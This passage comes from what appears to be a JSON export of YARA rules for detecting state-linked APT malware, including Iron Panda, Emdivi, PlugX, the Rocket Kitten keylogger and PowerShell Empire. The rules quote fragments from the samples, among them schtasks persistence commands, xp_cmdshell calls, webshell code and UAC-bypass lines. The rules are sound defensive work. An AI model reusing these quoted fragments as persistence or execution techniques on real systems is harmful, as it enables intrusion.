wide\n      $s10 = \"WININETMM\" fullword wide\n      $s11 = \"GET %dHTTP/1.1\" fullword ascii\n      $s12 = \"POST http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n      $s13 = \"PeekNamePipe\" fullword ascii\n      $s14 = \"Normal.dot\" fullword ascii\n      $s15 = \"R_eOR_eOR_eO)CiOS_eO\" fullword ascii\n      $s16 = \"DRIVE_RAMDISK\" fullword wide\n      $s17 = \"%s %s %s %s %d %d %d %d \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 250KB and 1 of ( $x* ) ) or 2 of ( $a* ) or 6 of ( $s* )\n}","date":"2015-09-24 11:17:51","description":"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule","minimum_yara":"1.7","name":"Unit78020_Malware_Gen1_RID2E84","reference":"http://threatconnect.com/camerashy/?utm_campaign=CameraShy","required_modules":[],"rule_hash":"83728ac064469e96e2777f4cfec7f8f8","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","GEN","EXE"]},{"author":"Florian Roth","content":"rule Unit78020_Malware_1_RID2D6A : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 10:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%ProgramFiles%\\\\Internet Explorer\\\\iexplore.exe\" fullword ascii\n      $s2 = \"msictl.exe\" fullword ascii\n      $s3 = \"127.0.0.1:8080\" fullword ascii\n      $s4 = \"mshtml.dat\" fullword ascii\n      $s5 = \"msisvc\" fullword ascii\n      $s6 = \"NOKIAN95/WEB\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 160KB and 4 of them\n}","date":"2015-09-24 10:30:51","description":"Detects malware by Chinese APT PLA Unit 78020 - Specific Rule - msictl.exe","minimum_yara":"1.7","name":"Unit78020_Malware_1_RID2D6A","reference":"http://threatconnect.com/camerashy/?utm_campaign=CameraShy","required_modules":[],"rule_hash":"65d433751af588375650541429136607","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule Unit78020_Malware_Gen2_RID2E85 : APT CHINA DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 11:18:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"-GetModuleFileNameExW\" fullword ascii\n      $s1 = \"\\\\MSN Talk Start.lnk\" fullword wide\n      $s2 = \":SeDebugPrivilege\" fullword wide\n      $s3 = \"WinMM Version 1.0\" fullword wide\n      $s4 = \"dwError1 = %d\" fullword ascii\n      $s5 = \"*Can't Get\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them\n}","date":"2015-09-24 11:18:01","description":"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule","minimum_yara":"1.7","name":"Unit78020_Malware_Gen2_RID2E85","reference":"http://threatconnect.com/camerashy/?utm_campaign=CameraShy","required_modules":[],"rule_hash":"56f9cfa9fcc5650cc824c3cac9d9ee87","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","GEN","EXE"]},{"author":"Florian Roth","content":"rule Unit78020_Malware_Gen3_RID2E86 : APT CHINA DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong\"\n      author = \"Florian Roth\"\n      reference = \"http://threatconnect.com/camerashy/?utm_campaign=CameraShy\"\n      date = \"2015-09-24 11:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"GET http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n      $x2 = \"POST http://%ws:%d/%d%s%dHTTP/1.1\" fullword ascii\n      $x3 = \"J:\\\\chong\\\\\" ascii\n      $s1 = \"User-Agent: Netscape\" fullword ascii\n      $s2 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/20100719 Firefox/1.0.7\" fullword ascii\n      $s3 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\explorer\\\\User Shell Folders\" fullword wide\n      $s4 = \"J:\\\\chong\\\\nod\\\\Release\\\\SslMM.exe\" fullword ascii\n      $s5 = \"MM.exe\" fullword ascii\n      $s6 = \"network.proxy.ssl\" fullword wide\n      $s7 = \"PeekNamePipe\" fullword ascii\n      $s8 = \"Host: %ws:%d\" fullword ascii\n      $s9 = \"GET %dHTTP/1.1\" fullword ascii\n      $s10 = \"SCHANNEL.DLL\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of ( $x* ) ) or 4 of ( $s* )\n}","date":"2015-09-24 11:18:11","description":"Detects malware by Chinese APT PLA Unit 78020 - Generic Rule - Chong","minimum_yara":"1.7","name":"Unit78020_Malware_Gen3_RID2E86","reference":"http://threatconnect.com/camerashy/?utm_campaign=CameraShy","required_modules":[],"rule_hash":"94206241e8087036f47f47591f2d4c67","score":75,"tags":["MAL","DEMO","FILE","APT","CHINA","GEN","EXE"]},{"author":"Florian Roth","content":"rule IronPanda_DNSTunClient_RID2F67 : APT CHINA DEMO EXE FILE T1053 {\n   meta:\n      description = \"Iron Panda malware DnsTunClient - file named.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 11:55:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, T1053\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dnstunclient -d or -domain <domain>\" fullword ascii\n      $s2 = \"dnstunclient -ip <server ip address>\" fullword ascii\n      $s3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"\\\\Microsoft\\\\Windows\\\\PLA\\\\System\\\\Microsoft Windows\\\" /tr \" fullword ascii\n      $s4 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /C schtasks /create /tn \\\"Microsoft Windows\\\" /tr \" fullword ascii\n      $s5 = \"taskkill /im conime.exe\" fullword ascii\n      $s6 = \"\\\\dns control\\\\t-DNSTunnel\\\\DnsTunClient\\\\DnsTunClient.cpp\" fullword ascii\n      $s7 = \"UDP error:can not bing the port(if there is unclosed the bind process?)\" fullword ascii\n      $s8 = \"use error domain,set domain pls use -d or -domain mark(Current: %s,recv %s)\" fullword ascii\n      $s9 = \"error: packet num error.the connection have condurt,pls try later\" fullword ascii\n      $s10 = \"Coversation produce one error:%s,coversation fail\" fullword ascii\n      $s11 = \"try to add many same pipe to select group(or mark is too easy).\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 2 of them ) or 5 of them\n}","date":"2015-09-16 11:55:41","description":"Iron Panda malware DnsTunClient - file named.exe","minimum_yara":"1.7","name":"IronPanda_DNSTunClient_RID2F67","reference":"https://goo.gl/E4qia9","required_modules":[],"rule_hash":"08b505078c843ba1db1837e0f25c410a","score":80,"tags":["DEMO","T1053","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule IronPanda_Malware1_RID2DE6 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:51:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"activedsimp.dll\" fullword wide\n      $s1 = \"get_BadLoginAddress\" fullword ascii\n      $s2 = \"get_LastFailedLogin\" fullword ascii\n      $s3 = \"ADS_UF_ENCRYPTED_TEXT_PASSWORD_ALLOWED\" fullword ascii\n      $s4 = \"get_PasswordExpirationDate\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}","date":"2015-09-16 10:51:31","description":"Iron Panda Malware","minimum_yara":"1.7","name":"IronPanda_Malware1_RID2DE6","reference":"https://goo.gl/E4qia9","required_modules":[],"rule_hash":"11de9f582ba4d3d6694c5ca9555194b7","score":80,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule IronPanda_Webshell_JSP_RID2F6E : APT CHINA DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Iron Panda Malware JSP\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 11:56:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Bin_ExecSql(\\\"exec master..xp_cmdshell'bcp \\\\\\\"select safile from \\\" + db + \\\"..bin_temp\\\\\\\" queryout \\\\\\\"\\\" + Bin_TextBox_SaveP\" ascii\n      $s2 = \"tc.Text=\\\"<a href=\\\\\\\"javascript:Bin_PostBack('zcg_ClosePM','\\\"+Bin_ToBase64(de.Key.ToString())+\\\"')\\\\\\\">Close</a>\\\";\" fullword ascii\n      $s3 = \"Bin_ExecSql(\\\"IF OBJECT_ID('bin_temp')IS NOT NULL DROP TABLE bin_temp\\\");\" fullword ascii\n   condition: \n      filesize < 330KB and 1 of them\n}","date":"2015-09-16 11:56:51","description":"Iron Panda Malware JSP","minimum_yara":"1.7","name":"IronPanda_Webshell_JSP_RID2F6E","reference":"https://goo.gl/E4qia9","required_modules":[],"rule_hash":"5b4b7c61818bc8ad0b7ee6d4cd4a7f7f","score":80,"tags":["T1100","MAL","DEMO","WEBSHELL","APT","CHINA"]},{"author":"Florian Roth","content":"rule IronPanda_Malware_Htran_RID3011 : APT CHINA DEMO EXE FILE MAL T1020 T1090 {\n   meta:\n      description = \"Iron Panda Malware Htran\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 12:24:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] Gethostbyname(%s) error:%s\" fullword ascii\n      $s2 = \"%s -<listen|tran|slave> <option> [-log logfile]\" fullword ascii\n      $s3 = \"-slave <ConnectHost> <ConnectPort> <TransmitHost> <TransmitPort>\" fullword ascii\n      $s4 = \"[-] ERROR: Must supply logfile name.\" fullword ascii\n      $s5 = \"[SERVER]connection to %s:%d error\" fullword ascii\n      $s6 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n      $s7 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n      $s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n      $s9 = \"[+] Make a Connection to %s:%d ......\" fullword ascii\n      $s10 = \"cmshared_get_ptr_from_atom\" fullword ascii\n      $s11 = \"_cmshared_get_ptr_from_atom\" fullword ascii\n      $s12 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n      $s13 = \"[-] TransmitPort invalid.\" fullword ascii\n      $s14 = \"[+] Waiting for Client on port:%d ......\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 125KB and 3 of them ) or 5 of them\n}","date":"2015-09-16 12:24:01","description":"Iron Panda Malware Htran","minimum_yara":"1.7","name":"IronPanda_Malware_Htran_RID3011","reference":"https://goo.gl/E4qia9","required_modules":[],"rule_hash":"b38b00ef7f406bb84097167a2512cdd1","score":80,"tags":["T1090","MAL","DEMO","FILE","T1020","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule IronPanda_Malware2_RID2DE7 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:51:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\setup.exe\" fullword ascii\n      $s1 = \"msi.dll.urlUT\" fullword ascii\n      $s2 = \"msi.dllUT\" fullword ascii\n      $s3 = \"setup.exeUT\" fullword ascii\n      $s4 = \"/c del /q %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}","date":"2015-09-16 10:51:41","description":"Iron Panda Malware","minimum_yara":"1.7","name":"IronPanda_Malware2_RID2DE7","reference":"https://goo.gl/E4qia9","required_modules":[],"rule_hash":"478523e2ee451a9a7344f36da5341f4b","score":80,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule IronPanda_Malware3_RID2DE8 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:51:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PluginDeflater.exe\" fullword wide\n      $s1 = \".Deflated\" fullword wide\n      $s2 = \"PluginDeflater\" fullword ascii\n      $s3 = \"DeflateStream\" fullword ascii\n      $s4 = \"CompressionMode\" fullword ascii\n      $s5 = \"System.IO.Compression\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them\n}","date":"2015-09-16 10:51:51","description":"Iron Panda Malware","minimum_yara":"1.7","name":"IronPanda_Malware3_RID2DE8","reference":"https://goo.gl/E4qia9","required_modules":[],"rule_hash":"bfa3859a2f065f646a5f15a603204572","score":80,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule IronPanda_Malware4_RID2DE9 : APT CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:52:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"TestPlugin.dll\" fullword wide\n      $s1 = \"<a href='http://www.baidu.com'>aasd</a>\" fullword wide\n      $s2 = \"Zcg.Test.AspxSpyPlugins\" fullword ascii\n      $s6 = \"TestPlugin\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them\n}","date":"2015-09-16 10:52:01","description":"Iron Panda Malware","minimum_yara":"1.7","name":"IronPanda_Malware4_RID2DE9","reference":"https://goo.gl/E4qia9","required_modules":[],"rule_hash":"8673cb97d8ab4266fec94f56deb2025c","score":80,"tags":["MAL","DEMO","FILE","APT","CHINA","EXE"]},{"author":"Florian Roth","content":"rule MAL_APT_RocketKitten_Keylogger_RID326D : APT DEMO EXE FILE HKTL MAL MIDDLE_EAST T1056 {\n   meta:\n      description = \"Detects Keylogger used in Rocket Kitten APT\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/SjQhlp\"\n      date = \"2015-09-01 14:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, HKTL, MAL, MIDDLE_EAST, T1056\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\CWoolger.pdb\" ascii\n      $x2 = \"WoolenLoger\\\\obj\\\\x86\\\\Release\" ascii\n      $x3 = \"D:\\\\Yaser Logers\\\\\" \n      $z1 = \"woolger\" fullword wide\n      $s1 = \"oShellLink.TargetPath = \\\"\" fullword ascii\n      $s2 = \"wscript.exe \" fullword ascii\n      $s3 = \"strSTUP = WshShell.SpecialFolders(\\\"Startup\\\")\" fullword ascii\n      $s4 = \"[CapsLock]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or ( $z1 and 2 of ( $s* ) ) ) ) or ( $z1 and all of ( $s* ) )\n}","date":"2015-09-01 14:04:41","description":"Detects Keylogger used in Rocket Kitten APT","minimum_yara":"1.7","name":"MAL_APT_RocketKitten_Keylogger_RID326D","reference":"https://goo.gl/SjQhlp","required_modules":[],"rule_hash":"371e10680c2cec64629c2d671001e2f1","score":75,"tags":["MAL","DEMO","FILE","MIDDLE_EAST","APT","T1056","EXE","HKTL"]},{"author":"Florian Roth","content":"rule MAL_Korplug_FAST_RID2CBB : DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Rule to detect Korplug/PlugX FAST variant\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-08-20 10:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\rundll32.exe \\\"%s\\\", ShadowPlay\" fullword ascii\n      $a1 = \"ShadowPlay\" fullword ascii\n      $s1 = \"%s\\\\rundll32.exe \\\"%s\\\",\" fullword ascii\n      $s2 = \"nvdisps.dll\" fullword ascii\n      $s3 = \"%snvdisps.dll\" fullword ascii\n      $s4 = \"\\\\winhlp32.exe\" fullword ascii\n      $s5 = \"nvdisps_user.dat\" fullword ascii\n      $s6 = \"%snvdisps_user.dat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( $x1 or ( $a1 and 1 of ( $s* ) ) or 4 of ( $s* ) )\n}","date":"2015-08-20 10:01:41","description":"Rule to detect Korplug/PlugX FAST variant","minimum_yara":"1.7","name":"MAL_Korplug_FAST_RID2CBB","reference":"-","required_modules":[],"rule_hash":"fff9eaa3006bd9326cdc446f0b2c4c40","score":75,"tags":["DEMO","T1085","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Emdivi_SFX_RID2BF8 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emdivi malware in SFX Archive\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n      date = \"2015-08-20 09:29:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Setup=unsecess.exe\" fullword ascii\n      $x2 = \"Setup=leassnp.exe\" fullword ascii\n      $s1 = \"&Enter password for the encrypted file:\" fullword wide\n      $s2 = \";The comment below contains SFX script commands\" fullword ascii\n      $s3 = \"Path=%temp%\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 740KB and ( 1 of ( $x* ) and all of ( $s* ) )\n}","date":"2015-08-20 09:29:11","description":"Detects Emdivi malware in SFX Archive","minimum_yara":"1.7","name":"MAL_Emdivi_SFX_RID2BF8","reference":"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/","required_modules":[],"rule_hash":"48a1d72e13349fc01487383b03314c23","score":70,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Emdivi_Gen3_RID2C54 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emdivi Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n      date = \"2015-08-20 09:44:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)\" fullword ascii\n      $s2 = \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\\" fullword ascii\n      $s4 = \"\\\\auto.cfg\" fullword ascii\n      $s5 = \"/ncsi.txt\" fullword ascii\n      $s6 = \"/en-us/default.aspx\" fullword ascii\n      $s7 = \"cmd /c\" fullword ascii\n      $s9 = \"APPDATA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 850KB and ( ( $x1 and 1 of ( $s* ) ) or ( 4 of ( $s* ) ) )\n}","date":"2015-08-20 09:44:31","description":"Detects Emdivi Malware","minimum_yara":"1.7","name":"MAL_Emdivi_Gen3_RID2C54","reference":"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/","required_modules":[],"rule_hash":"18547d6ad5a9b859dfd85397e8acc331","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule MAL_Emdivi_Gen4_RID2C55 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emdivi Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n      date = \"2015-08-20 09:44:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".http_port\\\", \" fullword wide\n      $s2 = \"UserAgent: \" fullword ascii\n      $s3 = \"AUTH FAILED\" fullword ascii\n      $s4 = \"INVALID FILE PATH\" fullword ascii\n      $s5 = \".autoconfig_url\\\", \\\"\" fullword wide\n      $s6 = \"FAILED TO WRITE FILE\" fullword ascii\n      $s7 = \".proxy\" fullword wide\n      $s8 = \"AuthType: \" fullword ascii\n      $s9 = \".no_proxies_on\\\", \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 853KB and all of them\n}","date":"2015-08-20 09:44:41","description":"Detects Emdivi Malware","minimum_yara":"1.7","name":"MAL_Emdivi_Gen4_RID2C55","reference":"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/","required_modules":[],"rule_hash":"6b8302e3e12d1559845c42cbda8d05db","score":80,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule CheshireCat_Sample2_RID2E47 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule - file dc18850d065ff6a8364421a9c8f9dd5fcce6c7567f4881466cee00e5cd0c7aa8\"\n      author = \"Florian Roth\"\n      reference = \"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/\"\n      date = \"2015-08-08 11:07:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"mpgvwr32.dll\" fullword ascii\n      $s1 = \"Unexpected failure of wait! (%d)\" fullword ascii\n      $s2 = \"\\\"%s\\\" /e%d /p%s\" fullword ascii\n      $s4 = \"error in params!\" fullword ascii\n      $s5 = \"sscanf\" fullword ascii\n      $s6 = \"<>Param : 0x%x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 4 of ( $s* )\n}","date":"2015-08-08 11:07:41","description":"Semiautomatic generated rule - file dc18850d065ff6a8364421a9c8f9dd5fcce6c7567f4881466cee00e5cd0c7aa8","minimum_yara":"1.7","name":"CheshireCat_Sample2_RID2E47","reference":"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/","required_modules":[],"rule_hash":"328474022f4d377f6192bed6dcc9c790","score":90,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule CheshireCat_Gen2_RID2CFF : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule\"\n      author = \"Florian Roth\"\n      reference = \"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/\"\n      date = \"2015-08-08 10:13:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"Interface\\\\%s\\\\info\" fullword ascii\n      $a2 = \"Interface\\\\%s\\\\info\\\\%s\" fullword ascii\n      $a3 = \"CLSID\\\\%s\\\\info\\\\%s\" fullword ascii\n      $a4 = \"CLSID\\\\%s\\\\info\" fullword ascii\n      $b1 = \"Windows Shell Icon Handler\" fullword wide\n      $b2 = \"Microsoft Shell Icon Handler\" fullword wide\n      $s1 = \"\\\\StringFileInfo\\\\%s\\\\FileVersion\" fullword ascii\n      $s2 = \"CLSID\\\\%s\\\\AuxCLSID\" fullword ascii\n      $s3 = \"lnkfile\\\\shellex\\\\IconHandler\" fullword ascii\n      $s4 = \"%s: %s, %.2hu %s %hu %2.2hu:%2.2hu:%2.2hu GMT\" fullword ascii\n      $s5 = \"%sMutex\" fullword ascii\n      $s6 = \"\\\\ShellIconCache\" fullword ascii\n      $s7 = \"+6Service Pack \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 7 of ( $s* ) and 2 of ( $a* ) and 1 of ( $b* )\n}","date":"2015-08-08 10:13:01","description":"Semiautomatic generated rule","minimum_yara":"1.7","name":"CheshireCat_Gen2_RID2CFF","reference":"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/","required_modules":[],"rule_hash":"33fcd67aee2118149a54cb3b1dfd042b","score":90,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Empire_Invoke_BypassUAC_RID2FE8 : DEMO SCRIPT SUSP T1086 T1088 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Invoke-BypassUAC.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:17:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086, T1088\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory\" fullword ascii\n      $s2 = \"$proc = Start-Process -WindowStyle Hidden notepad.exe -PassThru\" fullword ascii\n      $s3 = \"$Payload = Invoke-PatchDll -DllBytes $Payload -FindString \\\"ExitThread\\\" -ReplaceString \\\"ExitProcess\\\"\" fullword ascii\n      $s4 = \"$temp = [System.Text.Encoding]::UNICODE.GetBytes($szTempDllPath)\" fullword ascii\n   condition: \n      filesize < 1200KB and 3 of them\n}","date":"2015-08-06 12:17:11","description":"Empire - a pure PowerShell post-exploitation agent - file Invoke-BypassUAC.ps1","minimum_yara":"1.7","name":"Empire_Invoke_BypassUAC_RID2FE8","reference":"https://github.com/PowerShellEmpire/Empire","required_modules":[],"rule_hash":"87f4ffc5ca0f06a2680abeb6b903837a","score":70,"tags":["SUSP","DEMO","T1086","SCRIPT","T1088"]},{"author":"Florian Roth","content":"rule Empire_lib_modules_trollsploit_message_RID36CC : DEMO SCRIPT SUSP T1086 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file message.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 17:11:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, SUSP, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"script += \\\" -\\\" + str(option) + \\\" \\\\\\\"\\\" + str(values['Value'].strip(\\\"\\\\\\\"\\\")) + \\\"\\\\\\\"\\\"\" fullword ascii\n      $s2 = \"if option.lower() != \\\"agent\\\" and option.lower() != \\\"computername\\\":\" fullword ascii\n      $s3 = \"[String] $Title = 'ERROR - 0xA801B720'\" fullword ascii\n      $s4 = \"'Value'         :   'Lost contact with the Domain Controller.'\" fullword ascii\n   condition: \n      filesize < 10KB and 3 of them\n}","date":"2015-08-06 17:11:11","description":"Empire - a pure PowerShell post-exploitation agent - file 